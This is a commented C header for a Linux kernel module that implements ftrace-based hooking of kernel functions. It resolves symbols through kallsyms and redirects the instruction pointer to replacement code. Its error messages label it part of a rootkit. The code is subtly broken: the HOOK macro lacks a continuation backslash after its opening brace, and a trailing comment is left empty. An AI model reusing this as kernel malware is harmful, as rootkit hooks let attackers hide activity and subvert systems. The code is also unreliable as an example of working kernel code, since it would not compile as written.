/* This is called a header guard, it prevents the file from
 * being included twice in the same compilation unit. The header guard
 * includes #ifndef, #define and #endif */
#ifndef _FTRACE_HELPER_H
#define _FTRACE_HELPER_H

#include <linux/ftrace.h> // ftrace API that I'm building on top of
#include <linux/kallsyms.h> // How I find kernel functions by name at runtime
#include <linux/kernel.h> // Basic kernel types + macros
#include <linux/module.h> // Module calling
#include <linux/version.h> // Handling differences between kernel versions

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
#define PTREGS_SYSCALL_STUBS 1
/* CONFIG_X86_64 = Variable the kernel build system defines automatically when compiling for a 64-bit Intel/AMD processor.
 * LINUX_VERSION_CODE = # the represents kernel version, ex: kernel 5.14.0 = 330240, it's just a way to compare versions
 * through an integer.
 * KERNEL_VERSION(4, 17, 0) = Macro that takes major, minor, patch and converts it to that number above
 *
 * The define says if both (Running 64-bit x86 CPU & kernel is 4.17 or newer) are true, then set PTREGS_SYSCALL_STUBS to 1.
 * This flag, which is just a variable basically and made up for my own purpose, will be checked later with
 * #ifdef PTREGS_SYSCALL_STUBS to decide which version of the hook functions (That I'll make later) to write with.
 * Basically, tldr, "remember what kinda system this is so I can write compatible code later" */
#endif

struct ftrace_hook { // Struct = bundle of related variables grouped tgthr in one name.
    const char *name; // Name of kernel function that's gonna be hooked
    void *function; // Pointer to replacement function
    void *original; // Pointer to store address of real function, so it can be called from inside hook
    unsigned long address; // Mem addr of the kernel function that's getting hooked
    struct ftrace_ops ops; // ftrace-specific strut kernel already uses to manage hook
};

#define HOOK(_name, _hook, _orig) \
{
    .name = (_name),     \
    .function = (_hook), \
    .original = (_orig), \
}
/* Above is a macro: it's just a text substitution. Before compiling, the compiler finds every use of HOOK and replaces it
 * with whatever's defined within. It's a shortcut so I don't have to type out a ftrace_hook struct every time.
 * The \ are just for readability, it's technically all on one line. */

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;

}
/* More explaination, yay.
 * notrace = tells ftrace to never hook this function itself, bc otherwise it'd be recursive
 * The Parameters:
 *      ip = addr of function being hooked
 *      parent_ip = addr of whoever called that function
 *      *ops = ftrace_ops struct assoc. w/ this hook
 *      *fregs = the CPU registers at the moment of the call
 *"container_of()" = kernel macro that does *pointer math*. There's a pointer to ops field inside struct, and this gives
 *                   the pointer back. It's how you get the ftrace callback to this data.
 * "ftrace_get_regs(fregs)" = extract the pt_regs (which is a CPU reg snapshot) from fregs so they can be modified
 * "if (!within..blahblah)" = checking whether the caller is inside the module, aka if the execution was already redirected,
 *                            don't redirect again to avoid infinity.
 * "regs->ip = blahblah" = THIS is the redirect. ip is "instruction pointer", CPU register says "execute code right here at
 *                         this addr," and it's overwritten with this hook function's addr; this makes it so when this
 *                         function returns, the CPU jumps to this code instead of the original. */

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;

    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("rootkit: couldn't find symbol: %s\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->original) = hook->address;

    hook->ops.func  = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
    | FTRACE_OPS_FL_RECURSION
    | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_err("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("rootkit: register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

/* Another paragraph:
 */

#endif /*_FTRACE_HELPER_H */
